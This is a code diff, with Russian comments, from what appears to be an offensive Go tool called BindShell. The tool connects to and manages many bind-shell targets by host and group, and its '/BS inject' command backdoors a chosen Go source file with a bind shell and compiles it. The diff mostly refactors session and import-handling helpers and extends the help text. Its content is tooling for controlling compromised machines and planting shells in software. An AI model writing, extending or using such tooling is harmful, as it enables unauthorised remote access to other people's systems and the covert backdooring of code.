@@ -4,21 +4,11 @@ import (
 	"bufio"
 	"fmt"
 	"log"
-	"net"
 	"os"
 	"os/exec"
-	"strconv"
 	"strings"
 	"time"
 )
-
-// Структура цели
-type Target struct {
-	name   string
-	conn   net.Conn
-	status bool
-	group  string
-}
 
 var global_response_timeout int = 1000
 var global_buffer_size int = 4096
@@ -29,10 +19,14 @@ func BindShellHelp() {
 	fmt.Println("[BindShell] Command list:")
 	fmt.Println("\n\t\tTargets:")
 	fmt.Println("\t- /BS targets \t\t\tShow current targets list;")
-	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip>:<port> to set;")
+	fmt.Println("\t- /BS add <ip:port> \t\tAdd target <ip:port> to set;")
 	fmt.Println("\t- /BS remove <host_id> \t\tRemove target from set;")
+	fmt.Println("\t- /BS off \t\t\tStop sending commands to the all hosts;")
 	fmt.Println("\t- /BS off <host_id> \t\tStop sending commands to the host;")
-	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host.")
+	fmt.Println("\t- /BS off group <group> \tStop sending commands to the <group>;")
+	fmt.Println("\t- /BS on \t\t\tResume sending commands to the all hosts;")
+	fmt.Println("\t- /BS on <host_id> \t\tResume sending commands to the host;")
+	fmt.Println("\t- /BS on group <group> \t\tResume sending commands to the <group>.")
 
 	fmt.Println("\n\t\tShell injecting:")
 	fmt.Println("\t- /BS inject <file_path> <shell_type> <OS> <Arch> <ip> <port> \t\tInject bind shell to code and compile it. (BETA)")
@@ -131,70 +125,8 @@ func BindShellAdd(targets *[]Target, target_name string) {
 	addSession(targets, target_name)
 }
 
-func addSession(targets *[]Target, target_name string) {
-	// Установка соединения с целевым хостом
-	conn, err := net.Dial("tcp", target_name)
-	if err != nil {
-		fmt.Printf("[BindShell] %s << Connection NOT established.\n", target_name)
-		return
-	} else {
-		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
-	}
-
-	// Создание буфера для считывания ОС целевого хоста
-	init_buf := make([]byte, global_buffer_size)
-
-	// Чтение ОС хоста
-	n, err := conn.Read(init_buf)
-	if err != nil {
-		fmt.Println("[BindShell] Failed to read host OS!\n")
-	}
-
-	// Добавление хоста в список целей
-	*targets = append(*targets, Target{name: target_name, conn: conn, status: true, group: string(init_buf[:n])})
-
-	active_targets++
-}
-
-func finishSession(target Target) {
-	if target.conn.Close() == nil {
-		fmt.Printf("[BindShell] %s << Connection successfully terminated.\n", target.name)
-	}
-}
-
-func finishAllSessions(targets *[]Target) {
-	for i := 0; i < len(*targets); i++ {
-		finishSession((*targets)[i])
-	}
-}
-
-func checkTargetNumber(targets *[]Target, input string) (bool, int) {
-	idx, err := strconv.Atoi(input)
-	if err != nil {
-		fmt.Println("[BindShell] The index is an invalid number!")
-		return false, 0
-	} else if idx >= len(*targets) || idx < 0 {
-		fmt.Println("[BindShell] The index is out of bounds!")
-		return false, 0
-	} else {
-		return true, idx
-	}
-}
-
-func checkPositiveNumber(input string) (bool, int) {
-	value, err := strconv.Atoi(input)
-	if err != nil {
-		fmt.Println("[BindShell] The value is an invalid number!")
-		return false, 0
-	} else if value < 0 {
-		fmt.Println("[BindShell] The value lower then zero!")
-		return false, 0
-	} else {
-		return true, value
-	}
-}
-
 func BindShellLoadTargets(targets *[]Target, targets_file string) {
+	// Обнуление числа текущих целей
 	active_targets = 0
 
 	// Завершение всех активных соединений
@@ -277,7 +209,7 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	// Проверка и добавление необходимых импортов
 	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
 	for _, reqImport := range requiredImports {
-		if !contains(imports, reqImport) {
+		if !isImportContains(imports, reqImport) {
 			new_imports = append(new_imports, reqImport)
 			fmt.Printf("Импорт %s добавлен.\n", reqImport)
 		}
@@ -296,11 +228,6 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 		return
 	}
 	defer new_file.Close()
-
-	if err != nil {
-		fmt.Println("Writing error!")
-		return
-	}
 
 	// Инициализация строки с инъекцией
 	BS_string := ""
@@ -365,45 +292,6 @@ func BindShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 	fmt.Println("[BindShell] File successfully compiled.")
 }
 
-// Проверяет наличие необходимых импортов
-func contains(imports []string, imp string) bool {
-	for _, i := range imports {
-		if i == imp {
-			return true
-		}
-	}
-	return false
-}
-
-// Обновляет секцию импортов
-func updateImports(lines []string, new_imports []string) []string {
-	var updatedLines []string
-	importSectionStarted := false
-
-	for _, line := range lines {
-		if strings.HasPrefix(line, "import (") {
-			importSectionStarted = true
-			updatedLines = append(updatedLines, line)
-			for _, imp := range new_imports {
-				updatedLines = append(updatedLines, "\t"+imp)
-			}
-			continue // Пропускаем добавление закрывающей скобки здесь
-		}
-
-		if importSectionStarted && strings.TrimSpace(line) == ")" {
-			importSectionStarted = false
-		}
-
-		updatedLines = append(updatedLines, line)
-	}
-
-	if importSectionStarted { // Если секция импорта была открыта, добавим закрывающую скобку
-		updatedLines = append(updatedLines, ")")
-	}
-
-	return updatedLines
-}
-
 func BindShellRequest(request []string, targets *[]Target) {
 	// В случае, если конкретная инструкция не указана, вызывается /BS help
 	if len(request) == 1 {
@@ -434,7 +322,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "off":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"\n")
+			fmt.Println("[BindShell] Error! Correct usage: \"/BS off\" or \"/BS off <host_id>\"")
 			return
 		}
 
@@ -466,7 +354,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "on":
 		// Если аргументов более трех, остановка
 		if len(request) > 4 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"\n")
+			fmt.Println("[BindShell] Error! Correct usage: \"/BS on\" or \"/BS on <host_id>\"")
 			return
 		}
 
@@ -498,7 +386,7 @@ func BindShellRequest(request []string, targets *[]Target) {
 	case "remove":
 		// Если аргументов более трех, остановка
 		if len(request) > 3 {
-			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"\n")
+			fmt.Println("[BindShell] Error! Correct usage: \"/BS remove\" or \"/BS remove <host_id>\"")
 			return
 		}
 
